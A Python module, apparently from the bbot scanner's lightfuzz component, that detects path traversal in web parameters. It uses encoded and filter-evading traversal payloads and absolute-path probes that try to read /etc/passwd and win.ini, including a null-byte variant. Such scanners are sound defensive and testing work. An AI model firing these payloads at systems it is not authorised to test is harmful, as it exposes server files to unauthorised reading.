from .base import BaseLightfuzz
from bbot.errors import HttpCompareError

import re
import urllib.parse


class PathTraversalLightfuzz(BaseLightfuzz):

    async def fuzz(self):
        cookies = self.event.data.get("assigned_cookies", {})
        probe_value = self.probe_value(populate_empty=False)
        if not probe_value:
            self.lightfuzz.debug(
                f"Path Traversal detection requires original value, aborting [{self.event.data['type']}] [{self.event.data['name']}]"
            )
            return

        # Single dot traversal tolerance test

        path_techniques = {
            "single-dot traversal tolerance (no-encoding)": {
                "singledot_payload": f"/./a/../{probe_value}",
                "doubledot_payload": f"/../a/../{probe_value}",
            },
            "single-dot traversal tolerance (url-encoding)": {
                "singledot_payload": urllib.parse.quote(f"/./a/../{probe_value}".encode(), safe=""),
                "doubledot_payload": urllib.parse.quote(f"/../a/../{probe_value}".encode(), safe=""),
            },
            "single-dot traversal tolerance (non-recursive stripping)": {
                "singledot_payload": f"/...//a/....//{probe_value}",
                "doubledot_payload": f"/....//a/....//{probe_value}",
            },
            "single-dot traversal tolerance (double url-encoding)": {
                "singledot_payload": f"%252f.%252fa%252f..%252f{probe_value}",
                "doubledot_payload": f"%252f..%252fa%252f..%252f{probe_value}",
            },
        }

        linux_path_regex = re.match(r"\/(?:\w+\/?)+\.\w+", probe_value)
        if linux_path_regex is not None:
            original_path_only = "/".join(probe_value.split("/")[:-1])
            original_filename_only = probe_value.split("/")[-1]
            path_techniques["single-dot traversal tolerance (start of path validation)"] = {
                "singledot_payload": f"{original_path_only}/./{original_filename_only}",
                "doubledot_payload": f"{original_path_only}/../{original_filename_only}",
            }

        for path_technique, payloads in path_techniques.items():
            iterations = 5  # one failed detection is tolerated, as long as its not the first run
            confirmations = 0
            while iterations > 0:
                try:
                    http_compare = self.compare_baseline(self.event.data["type"], probe_value, cookies)
                    singledot_probe = await self.compare_probe(
                        http_compare, self.event.data["type"], payloads["singledot_payload"], cookies
                    )
                    doubledot_probe = await self.compare_probe(
                        http_compare, self.event.data["type"], payloads["doubledot_payload"], cookies
                    )

                    if (
                        singledot_probe[0] == True
                        and doubledot_probe[0] == False
                        and doubledot_probe[3] != None
                        and doubledot_probe[1] != ["header"]
                        and "The requested URL was rejected" not in doubledot_probe[3].text
                    ):
                        confirmations += 1
                        self.lightfuzz.verbose(
                            f"Got possible Path Traversal detection: [{str(confirmations)}] Confirmations"
                        )
                        if confirmations > 3:
                            self.results.append(
                                {
                                    "type": "FINDING",
                                    "description": f"POSSIBLE Path Traversal. {self.metadata()} Detection Method: [{path_technique}]",
                                }
                            )
                            # no need to report both techniques if they both work
                            break
                except HttpCompareError as e:
                    iterations -= 1
                    self.lightfuzz.debug(e)
                    continue

                iterations -= 1
                if confirmations == 0:
                    break

        # Absolute path test

        absolute_paths = {
            r"c:\\windows\\win.ini": "; for 16-bit app support",
            "/etc/passwd": "daemon:x:",
            "../../../../../etc/passwd%00.png": "daemon:x:",
        }

        for path, trigger in absolute_paths.items():
            r = await self.standard_probe(self.event.data["type"], cookies, path)
            if r and trigger in r.text:
                self.results.append(
                    {
                        "type": "FINDING",
                        "description": f"POSSIBLE Path Traversal. {self.metadata()} Detection Method: [Absolute Path: {path}]",
                    }
                )
